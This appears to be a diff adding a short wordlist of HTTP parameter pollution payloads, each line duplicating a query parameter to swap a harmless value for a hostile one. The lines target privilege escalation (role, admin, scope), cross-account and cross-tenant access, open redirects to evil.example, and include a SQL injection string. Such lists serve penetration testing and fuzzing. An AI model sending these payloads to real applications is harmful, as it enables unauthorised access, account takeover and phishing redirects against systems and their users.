@@ -1,0 +1,16 @@
+# HTTP parameter pollution advanced payloads
+id=1&id=2
+id=1&id=admin
+user=guest&user=admin
+role=user&role=admin
+admin=false&admin=true
+redirect=/&redirect=https://evil.example
+next=/home&next=//evil.example
+q=test&q=' OR '1'='1
+sort=name&sort=password
+filter=public&filter=private
+callback=safe&callback=alert
+debug=false&debug=true
+tenant=1&tenant=2
+account_id=1&account_id=2
+scope=read&scope=admin
